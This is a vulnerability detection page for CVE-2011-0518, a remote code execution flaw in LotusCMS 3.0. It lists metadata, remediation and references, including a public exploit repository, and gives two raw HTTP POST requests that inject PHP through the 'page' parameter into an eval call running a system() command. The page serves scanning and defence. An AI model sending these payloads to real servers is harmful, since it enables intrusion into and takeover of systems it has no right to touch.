---
layout: "post"
cve_id: "CVE-2011-0518"
title: "LotusCMS 3.0 - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2011/CVE-2011-0518.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2011/CVE-2011-0518.yaml"
author: "pikpikcu"
severity: "critical"
impact: "Remote attackers can include and execute arbitrary local files, potentially leading to remote code execution or full system compromise.
"
remediation: "Enable magic_quotes_gpc or sanitize 'system' parameter, and update to the latest version of LotusCMS Fraise.
"
reference:
  - "https://github.com/Hood3dRob1n/LotusCMS-Exploit"
  - "https://nvd.nist.gov/vuln/detail/CVE-2011-0518"
classification: "{'cvss-metrics': 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 'cvss-score': 10, 'cve-id': 'CVE-2011-0518', 'epss-score': 0.61971, 'epss-percentile': 0.98272, 'cwe-id': 'CWE-77'}"
metadata: "{'max-request': 2, 'verified': True}"
tags:
  - "cve"
  - "cve2011"
  - "lotuscms"
  - "rce"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
LotusCMS 3.0 is susceptible to remote code execution via the Router () function. This is done by embedding PHP code in the 'page' parameter, which will be passed to a eval call and allow remote code execution.


## üåê HTTP Request
```nohighlight
POST /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WOW64; rv:41.0) Gecko/20100101 Firefox/140.0.4 (x64 de)
Connection: close
Content-Length: 56
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

page=index');${system('echo lotuscms_rce | md5sum')};#
```

```nohighlight
POST /lcms/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8
Connection: close
Content-Length: 56
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

page=index');${system('echo lotuscms_rce | md5sum')};#
```

